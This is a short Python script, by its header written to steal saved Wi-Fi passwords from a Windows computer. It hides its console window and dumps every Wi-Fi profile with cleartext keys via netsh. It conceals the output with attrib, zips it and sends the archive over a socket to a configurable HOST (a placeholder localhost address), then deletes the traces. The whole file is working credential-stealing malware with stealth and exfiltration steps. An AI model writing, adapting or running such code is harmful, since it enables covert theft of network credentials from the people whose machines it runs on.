'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#       Author:     Safwan                                                                  #
#       Date:       Friday, 19 February 2021 11:49:28 PM                                    #
#       Brief:      This program will extract wifi passwords from windows computer to the   #
#                   HOST                                                                    #
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


import ctypes
import os
import subprocess as sp
import shutil
import socket


HOST = '127.0.0.1'
PORT = 8080


def hide_window():
    h_user = ctypes.WinDLL("User32.dll")
    h_kernel = ctypes.WinDLL("Kernel32.dll")
    h_user.ShowWindow(h_kernel.GetConsoleWindow(), 0)


def hide_file(dir_name):
    sp.call(["attrib", dir_name, "+s", "+h", "/s", "/d"], shell=True)


def unhide_file(dir_name):
    sp.call(["attrib", dir_name, "-s", "-h", "/s", "/d"], shell=True)


def send_file(file_name):
    
    with open(file_name, "rb") as f:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        user = os.environ.get('username')
        s.sendfile(f)
        s.close()


def payload():
    os.mkdir("data")
    sp.call(["netsh", "wlan", "export", "profile",
             "key=clear", "folder=.\\data"], shell=True)
    hide_file("data")
    shutil._make_zipfile("data_dump", "data")
    hide_file("data_dump.zip")
    shutil.rmtree("data")
    send_file("data_dump.zip")
    os.remove("data_dump.zip")


def main():
    hide_window()
    payload()


main()
